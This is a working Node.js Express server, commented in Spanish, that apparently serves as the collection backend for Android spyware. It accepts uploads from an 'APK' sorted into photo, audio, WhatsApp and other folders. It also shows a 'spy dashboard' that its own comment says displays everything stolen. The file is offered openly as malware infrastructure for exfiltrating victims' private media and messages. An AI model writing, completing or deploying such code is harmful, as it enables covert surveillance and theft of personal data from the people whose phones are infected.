const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000; // Render asigna su propio puerto
const DATA = path.join(__dirname, 'data');
fs.mkdirSync(DATA, { recursive: true });

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const t = req.body.tipo || 'otros';
    const dir = path.join(DATA, t);
    fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => cb(null, Date.now() + '_' + file.originalname)
});
const upload = multer({ storage, limits: { fileSize: 50 * 1024 * 1024 } });

// El APK sube aquí: POST /api/subir
app.use(cors());
app.post('/api/subir', upload.single('file'), (req, res) => {
  console.log(`[${req.body.tipo}] ${req.file.filename} (${Math.round(req.file.size/1024)} KB)`);
  res.json({ ok: true });
});

// Dashboard: ver todo lo robado
app.get('/', (req, res) => {
  const tipos = ['foto', 'audio', 'whatsapp', 'otros'];
  let html = `<!doctype html><meta charset=utf-8><style>
    body{font-family:Arial;background:#0f172a;color:#e2e8f0;padding:24px}
    h1{color:#38bdf8} .tipo{margin:24px 0} .tipo h2{color:#10b981}
    img{max-width:200px;margin:4px;border-radius:8px}
    audio{margin:4px;display:block} a{color:#60a5fa}</style>
    <h1>🕵️ Dashboard del espía</h1>`;
  for (const t of tipos) {
    const dir = path.join(DATA, t);
    if (!fs.existsSync(dir)) continue;
    const files = fs.readdirSync(dir).reverse();
    if (!files.length) continue;
    html += `<div class="tipo"><h2>${t} (${files.length})</h2>`;
    for (const f of files) {
      if (f.endsWith('.jpg') || f.endsWith('.png'))
        html += `<img src="/data/${t}/${f}"><br><a href="/data/${t}/${f}" download>${f}</a>`;
      else if (f.endsWith('.m4a') || f.endsWith('.mp3'))
        html += `<audio controls src="/data/${t}/${f}"></audio>`;
      else html += `<a href="/data/${t}/${f}" download>${f}</a><br>`;
    }
    html += '</div>';
  }
  res.send(html);
});
app.use('/data', express.static(DATA));

app.listen(PORT, () => console.log(`Servidor del espía en http://localhost:${PORT}`));